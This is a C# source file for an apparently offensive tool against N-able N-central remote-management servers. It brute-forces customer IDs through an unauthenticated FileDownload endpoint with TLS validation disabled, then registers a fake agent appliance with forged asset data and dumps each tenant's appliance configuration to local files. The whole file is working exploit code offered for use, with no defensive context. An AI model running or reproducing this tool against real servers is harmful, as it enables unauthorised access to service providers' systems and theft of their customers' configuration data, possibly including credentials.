using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using com.nable.agent.framework;
using com.nable.agent.framework.serverproxy;
using com.nable.agent.framework.AssetDiscovery;
using CommandLine;
using Serilog;
using Serilog.Sinks.SystemConsole.Themes;
using com.nable.agent.framework.rpc;
using Harmony;
using com.nable.agent.framework.Configuration;
using System.Reflection;
using System.IO;

namespace nCentralDumpsterDiver
{
    class Program
    {
        private static HarmonyInstance _harmony = HarmonyInstance.Create("Harmony");
        static void Main(string[] args)
        {
            _harmony.PatchAll();
            Log.Logger = new LoggerConfiguration().WriteTo.Console(theme: AnsiConsoleTheme.Code).CreateLogger();
            CommandLine.Parser.Default.ParseArguments<Options>(args)
              .WithParsed(RunOptions);
        }
        static void RunOptions(Options _options)
        {
            foreach(string _currenturl in _options.InputUrls)
            {
                if (CheckValidURL(_currenturl))
                {
                    Log.Information("Processing {url} started", _currenturl);
                    List<int> _customerids = _options.CustomerID.ToList();
                    _customerids.Sort();
                    foreach (int _customerid in _customerids)
                    {
                        if(_customerid >= 0)
                        {
                            BruteForceUrlTest(_currenturl, _customerid, _customerid, Array.Empty<int>());
                        }
                        else
                        {
                            Log.Information("The customer id of {customerid} is invalid skipping", _customerid);
                        }
                    }
                    if (_options.BruteForceEnabled)
                    {
                        Log.Information("Starting bruteforce, this will exclude any previously specified customer id(s)");
                        BruteForceUrlTest(_currenturl, _options.CustomerIDMinimum, _options.CustomerIDMaximum, _customerids.ToArray());
                    }
                    Log.Information("Processing {url} completed.", _currenturl);
                }
                else
                    Log.Information("The url of {url} is invalid skipping", _currenturl);
            }
        }
        static void DumpConfiguration(string url, int customerid)
        {
            Log.Information("Attempting to dump {url} with customer id {id}", url, customerid);
            Random _random = new Random();
            Uri _target = new Uri(url);
            ApplianceConfig.Instance.ApplianceVersion = "12.2.1.198";
            ApplianceConfig.Instance.URL = url;
            ServerConfig.Instance.ServerIP = _target.Host;
            ApplianceConfig.Instance.Is64Bit = true;
            ApplianceConfig.Instance.Password = String.Empty;
            ApplianceConfig.Instance.PasswordEncrypt = null;
            String _RandomAssetName = $"{StringGenerator.GetUniqueString(12)}-PC";
            T_CimData _CimDataOperatingSystem = new T_CimData()
            {
                CimTableName = "OperatingSystem",
                Delta = null,
                ContentHash = null,
                LastContentHash = null,
                DeletedRecordIDs = null,
                CimFieldNames = OperatingSystemKeys.FIELDS.ToArray(),
                CimRecords = new T_CimRecord[] { new T_CimRecord() { 
                    Recordid = "00",
                    ContentHash = null,
                    CimValueFields = new string[] { "Microsoft Windows", null, null, null, null, "6.2.9200.0", null, null, null, null, null, null, null, null, null, null, null, null, null }
                } },
            };
            HashGenerator.ComputeHash(_CimDataOperatingSystem.CimRecords[0], HashGenerator.GetKeyColumnIndexes(_CimDataOperatingSystem.CimFieldNames, OperatingSystemKeys.KEYS));
            HashGenerator.ComputeHash(_CimDataOperatingSystem);

            T_CimData _CimDataNetworkAdapterConfiguration = new T_CimData()
            {
                CimTableName = "NetworkAdapterConfiguration",
                ContentHash = null,
                DeletedRecordIDs = null,
                CimFieldNames = NetworkAdapterConfigurationKeys.FIELDS.ToArray(),
                CimRecords = new T_CimRecord[] { new T_CimRecord()
                {
                    Recordid = StringGenerator.GetUniqueString(8,true),
                    ContentHash = null,
                    CimValueFields = new string[] { StringGenerator.GetUniqueMAC(),StringGenerator.GetUniqueIP(),String.Empty, $"{_RandomAssetName}.ncentral.dumpster.diver", null, String.Empty, String.Empty, String.Empty }
                } },
            };
            HashGenerator.ComputeHash(_CimDataNetworkAdapterConfiguration.CimRecords[0], HashGenerator.GetKeyColumnIndexes(_CimDataNetworkAdapterConfiguration.CimFieldNames, NetworkAdapterConfigurationKeys.KEYS));
            HashGenerator.ComputeHash(_CimDataNetworkAdapterConfiguration);

            T_CimData _CimDataNetworkAdapter = new T_CimData()
            {
                CimTableName = "NetworkAdapter",
                Delta = null,
                ContentHash = null,
                LastContentHash = null,
                DeletedRecordIDs = null,
                CimFieldNames = NetworkAdapterKeys.FIELDS.ToArray(),
                CimRecords = new T_CimRecord[] { new T_CimRecord()
                {
                    Recordid = StringGenerator.GetUniqueString(8,true),
                    ContentHash = null,
                    CimValueFields = new string[] { _CimDataNetworkAdapterConfiguration.CimRecords[0].CimValueFields[0], Guid.NewGuid().ToString().Replace("{","").Replace("}",""), "nCentral Dumpster Diver", null, null, null, null, null }
                } },
            };
            HashGenerator.ComputeHash(_CimDataNetworkAdapter.CimRecords[0], HashGenerator.GetKeyColumnIndexes(_CimDataNetworkAdapter.CimFieldNames, NetworkAdapterKeys.KEYS));
            HashGenerator.ComputeHash(_CimDataNetworkAdapter);

            T_AssetData _AssetData = new T_AssetData()
            {
                Name = _RandomAssetName,
                PrimaryIP = _CimDataNetworkAdapterConfiguration.CimRecords[0].CimValueFields[1],
                Fqdn = _CimDataNetworkAdapterConfiguration.CimRecords[0].CimValueFields[3],
                ExtraDetails = null,
                CimData = new T_CimData[] { _CimDataOperatingSystem, _CimDataNetworkAdapterConfiguration, _CimDataNetworkAdapter },
            };

            T_ApplianceRegistration _ApplianceRegistration = new T_ApplianceRegistration()
            {
                SilentInstall = new bool?(true),
                ApplianceType = "Agent",
                CustomerID = new int?(customerid),
                NetworkAssetDiscovery = new T_NetworkAssetDiscovery[0],
                OSID = "winnt",
                Version = ApplianceConfig.Instance.ApplianceVersion,
                IPAddress = _AssetData.PrimaryIP,
                AMTCredentials = "\t",
                ProxyString = "",
                ApplianceID = new int?(-1),
                AutoImport = new bool?(true),
                LocalAsset = _AssetData,
            };
            int _applianceID = -1;
            int _wait = 0;
            string _result = "";
            Log.Information("Creating fake appliance on {url} with customer id {id}", url, customerid);
            if (ServerProxy.Instance.applianceSelfRegistration(_ApplianceRegistration, out _applianceID, out _wait, out _result))
            {
                //success
                Log.Information("Created fake appliance on {url} with customer id {id}", url, customerid);
                ApplianceConfig.Instance.ApplianceID = _applianceID;
                ApplianceConfig.Instance.DiscoveryJobs = string.Empty;
                ApplianceConfig.Instance.CompletedRegistration = true;
                DiscoveryConfig.Instance.ApplianceStartTime = DateTime.Now.Ticks;
                Log.Information("Dumping configuration from {url} with customer id {id}", url, customerid);
                try
                { 
                    T_Config[] _Configs = ServerProxy.Instance.GetConfig(new string[] { "ApplianceConfig" });
                    if (_Configs != null)
                    {
                        Log.Information("Dumped configuration from {url} with customer id {id}", url, customerid);
                        StringBuilder _configBuilder = new StringBuilder();
                        foreach (T_Config _values in _Configs[0].ComplexValues)
                        {
                            if (_values.Values != null && _values.Values.Count() > 0)
                                _configBuilder.AppendLine($"{_values.Key1}={_values.Values[0]}");
                        }
                        string _path = $".\\{_target.Host}_{customerid.ToString()}.txt";
                        File.WriteAllText(_path, _configBuilder.ToString());
                        Log.Information("Configuration from {url} with customer id {id} dumped to {path}", url, customerid, _path);
                    }
                    else
                    {
                        Log.Error("Failed to dump configuration from {url} with customer id {id}", url, customerid);
                    }
                }
                catch(Exception _ex)
                {
                    Log.Error(_ex,"Failed to dump configuration from {url} with customer id {id}", url, customerid);
                }
            }
            else
            {
                Log.Error("Failed to create fake appliance on {url} with customer id {id}. Possibly Patched.", url, customerid);
            }

        }

        static void BruteForceUrlTest(string url, int min, int max, int[] exclusions)
        {
            WebRequestHandler _httpHandler = new WebRequestHandler()
            {
                ServerCertificateValidationCallback = delegate { return true; },
                ServerCertificateCustomValidationCallback = delegate { return true; },
            };
            HttpClient httpClient = new HttpClient(_httpHandler); //reuse per request
            List<int> _customerids = new List<int>();
            if (min > max)
            {
                Log.Information("Invalid minimum and maximum specified for bruteforce using defaults.");
                min = 100;
                max = 200;
            }
            _customerids = Enumerable.Range(min, (max - min)+1).ToList();
            foreach (int _exclusion in exclusions)
            {
                if (_customerids.Contains(_exclusion))
                    _customerids.Remove(_exclusion);
            }
            foreach(int _customerid in _customerids)
            {
                Log.Information("Testing {url} with customer id {id}", url, _customerid);
                if (UrlTest(httpClient, url, _customerid))
                {
                    Log.Information("{url} with customer id {id} is vulnerable, attempting configuration dump", url, _customerid);
                    DumpConfiguration(url, _customerid);
                }
                else
                {
                    Log.Information("{url} with customer id {id} is either not vulnerable or invalid", url, _customerid);
                }
            }
        }
        public static bool CheckValidURL(string source) => Uri.TryCreate(source, UriKind.Absolute, out Uri uriResult) && uriResult.Scheme == Uri.UriSchemeHttps;
        static bool UrlTest(HttpClient client, string url, int customerid)
        {
            if (client == null) throw new ArgumentNullException(nameof(client));
            if (String.IsNullOrWhiteSpace(url)) throw new ArgumentNullException(nameof(url));
            if (customerid < 0) throw new ArgumentOutOfRangeException(nameof(customerid));
            if (url.EndsWith("/") == true) { 
                url = url.Remove(url.Length - 1, 1); 
            }
            try
            {
                string _requesturl = $"{url}/dms/FileDownload?customerID={customerid}&softwareID=101";
                HttpRequestMessage _httpRequest = new HttpRequestMessage(HttpMethod.Head, new Uri(_requesturl));
                HttpResponseMessage _httpResponse = client.SendAsync(_httpRequest).GetAwaiter().GetResult();
                if (_httpResponse.StatusCode == System.Net.HttpStatusCode.OK)
                    return true;
                else
                    return false;
            }
            catch(Exception _ex)
            {
                return false;
            }
        }
    }
}
